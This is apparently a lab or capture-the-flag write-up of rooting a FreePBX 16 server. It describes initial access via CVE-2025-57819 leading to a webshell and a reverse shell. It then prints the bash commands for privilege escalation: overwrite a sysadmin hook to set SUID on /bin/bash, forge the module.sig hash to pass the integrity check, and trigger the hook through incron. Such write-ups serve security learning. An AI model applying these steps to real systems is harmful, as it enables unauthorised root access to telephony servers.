1. Enumeration and Initial Access
The reconnaissance phase, conducted with nmap, revealed an Apache web server running FreePBX version 16.0.40.7. Further inspection of the login page source code exposed an unusual string (iahtfj416p9h1t95h6jq54o2um) within a div element, suggesting potential credentials. Leveraging a known vulnerability for FreePBX (CVE-2025-57819), which involves an authentication bypass followed by SQL injection, I was able to achieve Remote Code Execution (RCE).

The exploit functioned by injecting a malicious entry into the cron_jobs database table. This triggered the creation of a webshell, allowing for the execution of arbitrary commands. Using curl, I sent a reverse shell payload to my listener, gaining a foothold as the asterisk user.

2. Privilege Escalation Strategy
Once inside, the objective was to escalate privileges to root. The investigation identified that the system utilizes the incrond daemon, which monitors the /var/spool/asterisk/incron/ directory. Files placed in this directory trigger the sysadmin_manager binary, which executes maintenance scripts with root privileges.

Critical to this path was the discovery that the asterisk user had write permissions to both the system hook scripts in /var/www/html/admin/modules/sysadmin/hooks/ and the integrity file /var/www/html/admin/modules/sysadmin/module.sig.

3. Exploitation Steps
To exploit the sysadmin_manager, I performed the following steps to bypass the integrity checks:

Modify Hook Script: I overwrote the update-hostname hook script to execute a command that sets the SUID bit on /bin/bash:

Bash
cat > /var/www/html/admin/modules/sysadmin/hooks/update-hostname << 'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF
chmod +x /var/www/html/admin/modules/sysadmin/hooks/update-hostname
Integrity Bypass: The sysadmin_manager validates script integrity by checking the SHA256 hash of the hook against the module.sig file. I calculated the new hash of my modified script and updated the signature file:

Bash
NEW_HASH=$(sha256sum /var/www/html/admin/modules/sysadmin/hooks/update-hostname | cut -d' ' -f1)
OLD_HASH=$(grep "hooks/update-hostname" /var/www/html/admin/modules/sysadmin/module.sig | awk '{print $3}')
sed -i "s/$OLD_HASH/$NEW_HASH/" /var/www/html/admin/modules/sysadmin/module.sig
Trigger Execution: Instead of copying the file to the spool directory (which risked deletion by incrond), I triggered the execution using touch. This instructed the system to run the hook:

Bash
touch /var/spool/asterisk/incron/sysadmin.update-hostname
Root Shell: After a short delay to allow the sysadmin_manager to process the hook, I utilized the SUID bit on the bash binary to obtain a root shell:

Bash
sleep 3 && /bin/bash -p
This approach successfully bypassed the system's integrity verification by "legalizing" the malicious script through the module.sig file and safely triggering its execution via the incrond service.




<img width="865" height="549" alt="image" src="https://github.com/user-attachments/assets/7384b8a1-d18c-4f2d-9075-202e909186e6" />
